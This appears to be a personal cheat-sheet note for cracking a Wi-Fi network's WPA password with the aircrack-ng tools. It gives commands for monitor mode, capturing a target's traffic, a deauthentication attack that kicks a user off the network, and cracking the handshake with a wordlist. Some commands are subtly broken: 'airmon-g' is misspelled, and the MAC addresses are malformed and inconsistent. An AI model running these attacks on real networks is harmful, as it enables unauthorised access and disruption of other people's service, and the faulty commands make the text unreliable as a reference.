


![[Pasted image 20230104142015.png]]



```bash
# start airmon
airmon-g check kill

airmon-ng start wlan0

iwconfig
```

```
# search area find target
airodump-ng wlan0mon

airodump-ng -c 6 --bssid 50:C7:8A:00:73 -w capture  wlan0mon
# flags
-c # channel
--bssid # mac
-w # file to dump to 
wlan0mon # nic

```

![[Pasted image 20230104142917.png]]

# Deauth
Kick user out of wifi
```
aireplay-ng -0 1 -a 50:C7:BF:8A:00:73 -c 3C:f0:22:DB:E3 wlan0mon
# flags
-0 1 # run attack 1 time
-a # target MAC
-c # target station 
```

![[Pasted image 20230104142946.png]]
# crack handshake
```
aircrack-ng -w /usr/share/wordlist/rockyou.txt -b 50:C7:BF:00:73 capture-01.cap
# FLAGS
-w # wordlist 
-b # target mac 
capture-01.cap # handshake file 
```

---
Tags: #wifi
Resources: